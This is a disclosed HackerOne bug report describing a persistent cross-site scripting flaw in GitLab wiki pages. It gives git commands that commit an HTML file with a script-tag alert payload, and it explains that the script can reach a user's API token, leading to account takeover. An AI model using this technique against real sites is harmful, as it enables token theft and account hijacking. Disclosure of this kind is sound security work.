# Persistent XSS on public wiki pages

## Report Details
- **Report ID**: 136333
- **URL**: https://hackerone.com/reports/136333
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-05-05T02:55:10.735Z
- **Disclosed**: 2016-07-27T21:44:23.111Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
# Details
There's a persistent cross-site scripting (XSS) vulnerability in the wiki pages. This can lead to an account take over via the leaked API token.

# Proof of concept
As an attacker, create a new public repository. Make sure you have a client that is allowed to push to that repository. For this PoC, lets say the repository is located at `git@gitlab.com/dummy/test.git`. On the client, execute the following commands:

git clone git@gitlab.com/dummy/test.git
cd test
echo "<script>alert('Hello world!');</script>" > index.html
git add index.html
git commit -m "This message is super important"
git push

Now go to https://gitlab.com/dummy/test/wikis/index.html. As you will see, this executes the JavaScript that is stored in the file.

{F91538}

# Impact
GitLab doesn't have a content security policy, which means that clients allow inline Javascript to be executed. This gives access to the current user its API token. The API token can be used to access the user its projects, do actions as the user, give access to potential confidential information, etc.

## Attachments
- Screen_Shot_2016-05-04_at_19.52.50.png
